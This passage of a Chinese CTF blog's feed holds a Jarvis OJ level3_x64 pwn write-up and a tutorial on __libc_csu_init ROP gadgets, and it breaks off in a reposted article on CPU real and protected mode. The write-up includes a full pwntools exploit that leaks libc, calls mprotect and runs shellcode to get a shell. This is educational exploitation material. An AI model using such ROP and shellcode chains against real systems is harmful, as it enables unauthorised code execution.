python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br></pre></td></tr></table></figure><h4 id="font-color-navy3将mprotect函数地址和shellcode写入bssfont"><a class="markdownIt-Anchor" href="#font-color-navy3将mprotect函数地址和shellcode写入bssfont"></a> <font color="navy"><code>3.将mprotect函数地址和shellcode写入bss</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload2</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-5.png" alt></p><h4 id="font-color-navy4将bss的权限改为可执行并返回shellcodefont"><a class="markdownIt-Anchor" href="#font-color-navy4将bss的权限改为可执行并返回shellcodefont"></a> <font color="navy"><code>4.将bss的权限改为可执行，并返回shellcode</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload3</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-6.png" alt></p><blockquote><p>完整的exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/129-1.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-brown0x00-相关知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-相关知
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="Jarvis" scheme="https://muzibing.github.io/tags/Jarvis/"/>
    
      <category term="栈溢出" scheme="https://muzibing.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>&lt;_libc_csu_init&gt;中的“通用gadget”</title>
    <link href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/17/2020.06.17（128）/</id>
    <published>2020-06-17T05:29:24.307Z</published>
    <updated>2020-06-17T11:12:23.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-基础知识font"></a> <font color="brown"><code>0x00 基础知识</code></font></h3><h4 id="font-color-navy1x86和x64的传参方式font"><a class="markdownIt-Anchor" href="#font-color-navy1x86和x64的传参方式font"></a> <font color="navy"><code>1.x86和x64的传参方式</code></font></h4><p>      由于X64和X86的传参的方式不同：X86是将参数入栈进行传参，X64则是将前6位参数分别通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，之后的参数才是通过入栈的形式进行传参，下面通过一个示例程序进行描述，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e, <span class="keyword">int</span> f, <span class="keyword">int</span> g ,<span class="keyword">int</span> h ,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a:%d\tb:%d\tc:%d\td:%d\te:%d\tf:%d\tg:%d\th:%d\ti:%d\t"</span>,a,b,c,d,e,f,g,h,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">100</span>,b=<span class="number">101</span>,c=<span class="number">102</span>,d=<span class="number">103</span>,e=<span class="number">104</span>,f=<span class="number">105</span>,g=<span class="number">106</span>,h=<span class="number">107</span>,i=<span class="number">108</span>; # 十六进制分别为<span class="number">0x64</span>、<span class="number">0x65</span>、<span class="number">0x66</span>、<span class="number">0x67</span>、<span class="number">0x68</span>、<span class="number">0x69</span>、<span class="number">0x6a</span>、<span class="number">0x6b</span>、<span class="number">0x6c</span>、</span><br><span class="line">    fun(a,b,c,d,e,f,g,h,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>x86的传参情况</code></p><p><img src="/images/128-1.png" alt></p><blockquote><p>从上图可以看出在<code>x86</code>下<code>fun</code>函数的参数是通过入栈的形式进行传递的</p></blockquote><p><code>x64的传参情况</code></p><p><img src="/images/128-2.jpg" alt></p><blockquote><p>从上图可以看出在<code>x64</code>下<code>fun</code>函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，后面的3个函数则是通过入栈的方式</p></blockquote><h4 id="font-color-navy2gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2gadgetfont"></a> <font color="navy"><code>2.gadget</code></font></h4><p>      由于x64下函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递的，所以我们需要一些类似于<code>pop rdi; ret</code>指令来改变这些寄存器的值，来满足我们的需求，而这些指令被称为<code>gadget</code>。</p><p><code>参数个数：1-2个</code></p><p>      当函数的参数比较少时，我们可以在程序中搜索一些简单的gadget指令，其中查找gadget的著名工具有：</p><blockquote><p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p><p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p><p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p><p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p></blockquote><p>      如下图：（使用工具为<code>ROPgadget</code>）</p><p><img src="/images/128-3.png" alt></p><p><code>参数个数：3个</code></p><p>      在上图中我们没有发现可以改变第3个参数的gadget指令（<code>pop rdx;ret</code>），那么我们就无法再控制指令了。因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。<sup>[1]</sup>下文会对通用函数<code>__libc_csu_init</code>中的gadget进行详细解释。一般来说，<a href="http://xn--libc-ps5fo9z9mtkk5bwgj322b30f.so" target="_blank" rel="noopener">只要程序调用了libc.so</a>，程序都会有这个函数用来对libc进行初始化操作。</p><h3 id="font-color-brown0x01-__libc_csu_init源码font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-__libc_csu_init源码font"></a> <font color="brown"><code>0X01 __libc_csu_init源码</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004011d0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4011d0:       41 57                   push   %r15</span><br><span class="line">  4011d2:       4c 8d 3d 37 2c 00 00    lea    0x2c37(%rip),%r15        # 403e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4011d9:       41 56                   push   %r14</span><br><span class="line">  4011db:       49 89 d6                mov    %rdx,%r14</span><br><span class="line">  4011de:       41 55                   push   %r13</span><br><span class="line">  4011e0:       49 89 f5                mov    %rsi,%r13</span><br><span class="line">  4011e3:       41 54                   push   %r12</span><br><span class="line">  4011e5:       41 89 fc                mov    %edi,%r12d</span><br><span class="line">  4011e8:       55                      push   %rbp</span><br><span class="line">  4011e9:       48 8d 2d 28 2c 00 00    lea    0x2c28(%rip),%rbp        # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011f0:       53                      push   %rbx</span><br><span class="line">  4011f1:       4c 29 fd                sub    %r15,%rbp</span><br><span class="line">  4011f4:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4011f8:       e8 03 fe ff ff          callq  401000 &lt;_init&gt;</span><br><span class="line">  4011fd:       48 c1 fd 03             sar    $0x3,%rbp</span><br><span class="line">  401201:       74 1b                   je     40121e &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  401203:       31 db                   xor    %ebx,%ebx</span><br><span class="line">  401205:       0f 1f 00                nopl   (%rax)</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  40122d:       0f 1f 00                nopl   (%rax)</span><br></pre></td></tr></table></figure><blockquote><p>我们将上述程序简化一下，并分为两个部分：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># part 1</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  </span><br><span class="line"># part 2</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq</span><br></pre></td></tr></table></figure><blockquote><p>从位于地址<code>401208</code>到<code>40120e</code>的指令，可以看出：</p><ul><li><code>r14</code> ----&gt; <code>rdx</code> ： <code>arg3</code></li><li><code>r13</code> ----&gt; <code>rsi</code> ： <code>arg2</code></li><li><code>r12</code> ----&gt; <code>rdi</code> ： <code>arg1</code></li></ul><p>我们可以看到利用<code>401222</code>处的代码我们可以控制<code>rbx,rbp,r12,r13,r14和r15</code>的值，随后利用<code>401208</code>处的代码我们将r15的值赋值给<code>rdx</code>,<code>r14</code>的值赋值给<code>rsi</code>,<code>r13</code>的值赋值给<code>edi</code>，随后就会调用<code>call qword ptr [r12+rbx*8]</code>。这时候我们只要再将<code>rbx</code>的值赋值为<code>0</code>，再通过精心构造栈上的数据，我们就可以控制<code>pc</code>去调用我们想要调用的函数了（比如说write函数）。执行完<code>call qword ptr [r12+rbx*8]</code>之后，程序会对<code>rbx+=1</code>，然后对比<code>rbp</code>和<code>rbx</code>的值，如果相等就会继续向下执行并<code>ret</code>到我们想要继续执行的地址。所以为了让<code>rbp</code>和<code>rbx</code>的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。<strong>注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用<code>write.got</code>的地址而不是<code>write.plt</code>的地址</strong>。</p></blockquote><h3 id="font-color-brown0x02-通用gadget在栈中的情况font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-通用gadget在栈中的情况font"></a> <font color="brown"><code>0X02 通用gadget在栈中的情况</code></font></h3><p>     我们先来推导一下上述代码运行时，栈中的变化，这里要注意的是我们须先执行<code>part2</code>部分的指令，然后再执行<code>part1</code>的指令，假设我们栈中是下图情况（存在栈溢出漏洞）</p><p><img src="/images/128-4.png" alt></p><p>      现在我们构造payload，根据栈中的情况：</p><blockquote><ul><li><code>return address</code>处应该是<code>part2</code>的入口地址</li><li>执行<code>part2</code>中的指令，这时esp指向<code>return address</code></li><li>6 个 <code>pop</code> 语句，依次将栈顶的数据赋值给寄存器<code>rbx</code>、<code>rbp</code>、<code>r12</code>、<code>r13</code>、<code>r14</code>、<code>r15</code></li><li>1 个 <code>ret</code> 语句，此时esp执行的时r15对应栈顶的位置+8</li></ul><p>则我们构造payload如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + <span class="string">"a"</span>*<span class="number">8</span><span class="comment"># 填充部分和old ebp部分</span></span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0，因为401211处的callq  *(%r15,%rbx,8)，我们要将r15的值为调用函数的地址</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1，因为401219处的cmp    %rbx,%rbp，这里必须要使得rbx和rbp相等，因为我们将rbx设置为0，而在401215处将rbx进行加1，所以这里rbp的值也要为1</span></span><br><span class="line">payload += p64(arg1)<span class="comment"># r12 = arg1</span></span><br><span class="line">payload += p64(arg2)<span class="comment"># r13 = arg2</span></span><br><span class="line">payload += p64(arg3)<span class="comment"># r14 = arg3</span></span><br><span class="line">payload += p64(function_got_addr)<span class="comment"># r15 = function_got_addr</span></span><br><span class="line">payload += p64(part1)<span class="comment"># return --&gt; part1</span></span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">56</span><span class="comment"># 6个pop指令 + add  $0x8,%rsp语句</span></span><br><span class="line">payload += p64(return_address)<span class="comment"># 返回到指定地址</span></span><br></pre></td></tr></table></figure><blockquote><p>上述payload在栈中的执行情况如下：</p></blockquote><p><img src="/images/128-5.gif" alt></p><p><a href="/pdf/128-5.pdf">点击下载上述过程文件</a></p><blockquote><p>要说明的是，这里的payload并不是固定的，要根据程序的实际情况来定</p></blockquote><h3 id="font-color-brown0x05-其他通用函数font"><a class="markdownIt-Anchor" href="#font-color-brown0x05-其他通用函数font"></a> <font color="brown"><code>0x05 其他通用函数</code></font></h3><p>除了上面介绍的 <code>__libc_csu_init()</code>，还可以到下面的函数中找一找：<sup>[2]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure><h3 id="font-color-brown0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-brown0x04-referencefont"></a> <font color="brown"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://segmentfault.com/a/1190000007406442" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p><p>[2] <a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.7_common_gadget.html" target="_blank" rel="noopener">通用 gadget</a></p><p>[3] <a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">ROP学习：利用通用gadget</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x0
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】CPU 的两种工作模式：实模式和保护模式</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88127%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（127）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-14T12:00:26.348Z</updated>
    
    <content type="html"><![CDATA[<p><font size="2">首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。</font></p><h3 id="font-color-navy0x00-实模式real-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-实模式real-modefont"></a> <font color="navy"><code>0x00 实模式（Real Mode）</code></font></h3><h4 id="font-color-brown1起源font"><a class="markdownIt-Anchor" href="#font-color-brown1起源font"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">实模式出现于早期 8086 CPU 时期，8086 也是第一款支持内存分段模型的处理器。当时，8086 只有一种工作模式，即实模式，但当时还没有这个说法。由于 CPU 的性能有限，一共只有 20 位地址线（地址空间只有 1M），以及 8 个 16 位的通用寄存器，以及 4 个 16 位的段寄存器。16 位的物理地址只能访问 64KB 的内存。所以，为了能够通过这些 16 位的寄存器去构成 20 位的主存地址，访问 1 MB 的内存，必须采取一种特殊的方式。</font></p><h4 id="font-color-brown2原理font"><a class="markdownIt-Anchor" href="#font-color-brown2原理font"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">第一个字段是由段寄存器提供的，是一个 16 位的段基址。第二字段是段内偏移量，它的值是由通用寄存器（如 EIP）来提供，所以也是 16 位。那么问题来了，两个 16 位的值如何组合成一个 20 位的地址呢？这里采用的方式是：把段寄存器所提供的段基址先向左移 4 位（或乘以 16），这样就变成了一个 20 位的值，然后再与 16 位的段偏移量相加。如下所示：</font></p><p><code>物理地址=段基址*16+段内偏移物理地址=段基址*16+段内偏移</code></p><p><font size="2">所以，假设段基址的值是<code>0xFF00</code>，段内偏移的值是<code>0x0110</code>。则物理地址可表示为:</font></p><p><code>0xFF00*16+0x0110 = 0xFF000+0x0110 = 